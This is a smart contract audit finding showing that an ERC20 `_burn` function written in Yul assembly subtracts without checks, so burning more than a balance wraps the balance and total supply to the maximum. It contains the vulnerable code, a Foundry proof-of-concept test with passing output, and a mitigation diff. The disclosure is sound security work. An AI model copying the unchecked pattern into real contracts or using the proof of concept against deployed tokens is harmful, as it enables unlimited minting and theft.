# Unchecked arithmetic in `_burn` allows balance and supply underflow

## Root + Impact

The `_burn` function in `ERC20Internals.sol` performs unchecked subtraction in Yul assembly, allowing arithmetic underflow when burning more tokens than an account holds. This critical flaw enables any user in a derived contract with an exposed burn function to inflate their balance to `type(uint256).max` and corrupt `totalSupply`, effectively granting unlimited token minting capability and destroying the token's economic model and all downstream integrations.

## Description

- Normal behavior: Burning tokens decreases the caller's balance and total supply, and emits a `Transfer` event from the zero address.
- Issue: `_burn` performs subtraction in Yul without pre-checks. In Yul, arithmetic is unchecked; `sub(accountBalance, value)` and `sub(supply, value)` wrap on underflow.

```solidity
// src/helpers/ERC20Internals.sol
// @_burn: unchecked subtraction in Yul
158: function _burn(address account, uint256 value) internal {
159:     assembly ("memory-safe") {
160:         if iszero(account) {
161:             mstore(0x00, shl(224, 0x96c6fd1e))
162:             mstore(add(0x00, 4), 0x00)
163:             revert(0x00, 0x24)
164:         }
165: 
166:         let ptr := mload(0x40)
167:         let balanceSlot := _balances.slot
168:         let supplySlot := _totalSupply.slot
169: 
170:         let supply := sload(supplySlot)
@>171:         sstore(supplySlot, sub(supply, value))
172: 
173:         mstore(ptr, account)
174:         mstore(add(ptr, 0x20), balanceSlot)
175: 
176:         let accountBalanceSlot := keccak256(ptr, 0x40)
177:         let accountBalance := sload(accountBalanceSlot)
@>178:         sstore(accountBalanceSlot, sub(accountBalance, value))
179:     }
180: }
```

## Risk

**Likelihood**:

- Occurs whenever a derived contract exposes `_burn` to regular users and they call it with `value > balance`.

**Impact**:

- Inflates user balances to `type(uint256).max`, breaks `totalSupply`, and corrupts all downstream accounting and integrations.

## Proof of Concept

```solidity
// test/PocBurnUnderflow.t.sol
// Setup: mint 100 tokens to user; Attack: burn 101; Assert: balances and supply become MAX
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "../src/ERC20.sol";

contract TestTokenHarness is ERC20 {
    constructor() ERC20("Test", "TST") {}

    function exposedMint(address to, uint256 value) external {
        _mint(to, value);
    }

    function exposedBurn(address from, uint256 value) external {
        _burn(from, value);
    }
}

contract PocBurnUnderflow is Test {
    TestTokenHarness private token;
    address private user = address(0xBEEF);

    function setUp() public {
        token = new TestTokenHarness();
        token.exposedMint(user, 100);
    }

    function test_BurnUnderflowInflatesBalanceAndSupply() public {
        token.exposedBurn(user, 101);

        uint256 bal = token.balanceOf(user);
        uint256 supply = token.totalSupply();

        assertEq(bal, type(uint256).max, "balance underflow wrapped to MAX");
        assertEq(supply, type(uint256).max, "supply underflow wrapped to MAX");
    }
}
```

## Test result

```bash
➜  2025-12-token-0x git:(main) ✗ forge test  --match-path test/PocBurnUnderflow.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/PocBurnUnderflow.t.sol:PocBurnUnderflow
[PASS] test_BurnUnderflowInflatesBalanceAndSupply() (gas: 21676)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.76ms (471.36µs CPU time)

Ran 1 test suite in 30.93ms (1.76ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommended Mitigation

```diff
 function _burn(address account, uint256 value) internal {
     assembly ("memory-safe") {
         if iszero(account) {
             // revert InvalidSender
         }
         let ptr := mload(0x40)
         let balanceSlot := _balances.slot
         let supplySlot := _totalSupply.slot
         let supply := sload(supplySlot)
-        sstore(supplySlot, sub(supply, value))
+        if lt(supply, value) {
+            mstore(0x00, shl(224, 0xe450d38c))
+            mstore(add(0x00, 4), account)
+            mstore(add(0x00, 0x24), supply)
+            mstore(add(0x00, 0x44), value)
+            revert(0x00, 0x64)
+        }
+        sstore(supplySlot, sub(supply, value))
         mstore(ptr, account)
         mstore(add(ptr, 0x20), balanceSlot)
         let accountBalanceSlot := keccak256(ptr, 0x40)
         let accountBalance := sload(accountBalanceSlot)
-        sstore(accountBalanceSlot, sub(accountBalance, value))
+        if lt(accountBalance, value) {
+            mstore(0x00, shl(224, 0xe450d38c))
+            mstore(add(0x00, 4), account)
+            mstore(add(0x00, 0x24), accountBalance)
+            mstore(add(0x00, 0x44), value)
+            revert(0x00, 0x64)
+        }
+        sstore(accountBalanceSlot, sub(accountBalance, value))
+        mstore(ptr, value)
+        log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, account, 0)
     }
 }
```
